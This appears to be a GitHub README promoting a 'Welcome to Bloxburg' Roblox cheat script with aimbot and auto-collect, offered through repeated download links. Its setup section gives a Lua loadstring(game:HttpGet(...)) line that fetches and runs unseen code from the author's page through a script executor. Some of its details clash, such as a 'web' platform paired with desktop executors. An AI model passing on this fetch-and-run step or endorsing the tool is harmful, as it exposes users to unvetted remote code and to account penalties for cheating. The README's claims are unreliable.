# Welcome to Bloxburg Script v1.0 - Game Script Utility 2026

> **A gameplay automation aid for Bloxburg.** Built for the Roblox platform, this script adds aimbot and auto-collect features to help handle common in-game chores more efficiently.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/andrewfisher1999/welcome-to-bloxburg-script?style=flat-square)](https://github.com/andrewfisher1999/welcome-to-bloxburg-script)

---

<p align="center">
  <a href="https://andrewfisher1999.github.io/welcome-to-bloxburg-script/">
    <img src="https://img.shields.io/badge/Download-Welcome%20to%20Bloxburg%20Script-brightgreen?style=for-the-badge" alt="Download Welcome to Bloxburg Script">
  </a>
</p>

> **[Direct Download - Welcome to Bloxburg Script](https://andrewfisher1999.github.io/welcome-to-bloxburg-script/)**

---

[Download Latest Build](https://andrewfisher1999.github.io/welcome-to-bloxburg-script/)

---

## What it does

This utility is made to automate selected actions inside Bloxburg, the Roblox roleplaying game. Its core behavior centers on two functions: aimbot-style targeting for supported interactions and automatic collection of items or resources. By taking over repetitive inputs, it lets players spend less time on routine tasks and more time on other parts of the game.

The 2026 release focuses on more reliable detection and better behavior during longer sessions. It runs as a lightweight overlay that hooks into the Bloxburg environment and performs preset actions according to user-defined values. The script is meant for the web version of Roblox and depends on a compatible script executor.

---

## Features

- **Aimbot Targeting** - Locks onto chosen targets automatically for steadier in-game interaction.
- **Auto-Collect Function** - Picks up resources or items without manual clicking, cutting down repetitive work.
- **Customizable Hotkeys** - Map keyboard shortcuts to switch script features on or off while playing.
- **Adjustable Range Settings** - Set the detection distance used by both aimbot and auto-collect logic.
- **Visual Feedback** - On-screen cues indicate when the script is running and carrying out actions.
- **Lightweight Execution** - Designed to keep overhead low on most modern browsers and systems.
- **Simple Configuration** - Change script variables directly in the code to fit your preferred setup.

---

## Setup

1. Download the script file from the link above.
2. Launch Roblox and join the Bloxburg game.
3. Open your preferred script executor (e.g., Synapse X, Krnl, or similar).
4. Copy the script code and paste it into the executor window.
5. Execute the script and wait for the confirmation message in the game chat or console.

Example minimal usage:
```lua
-- Load the script after executor is attached
loadstring(game:HttpGet("https://andrewfisher1999.github.io/welcome-to-bloxburg-script/"))()
```

---

## Options

The following settings can be adjusted within the script file before execution:

| Option | Values | Description |
|--------|--------|-------------|
| `AimbotEnabled` | `true` / `false` | Toggle aimbot functionality on or off |
| `AutoCollectEnabled` | `true` / `false` | Enable or disable automatic item collection |
| `Range` | `10` - `100` | Detection range in studs for both functions |
| `KeyToggleAimbot` | `"X"` | Hotkey to toggle aimbot during gameplay |
| `KeyToggleCollect` | `"C"` | Hotkey to toggle auto-collect during gameplay |

---

## Compatibility

- **Platform:** Web-based Roblox game client
- **Game Version:** Bloxburg (current public release)
- **Executors:** Works with most Lua script executors that support `loadstring` and `game:HttpGet`
- **Limitations:** May not function correctly if the game updates its internal structure. Anti-cheat systems in some executors may flag the script. Not tested on mobile or console platforms.

---

## FAQ

**How do I install this script?**  
Download the file, open your script executor while in the Bloxburg game, paste the code, and execute it.

**Will this script update automatically?**  
No, you need to download the latest version from the repository when updates are released.

**Can I change the hotkeys?**  
Yes, look for the key binding variables in the script and replace them with your preferred keys.

**Does this work on all Bloxburg servers?**  
It should work on any standard Bloxburg server, but performance may vary based on your executor and connection.

**Will my progress be saved while using this script?**  
Game progress is saved by Roblox servers normally. The script does not interfere with save data.

**Is this script detectable?**  
Use at your own discretion. The developer is not responsible for any account actions taken by the game platform.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
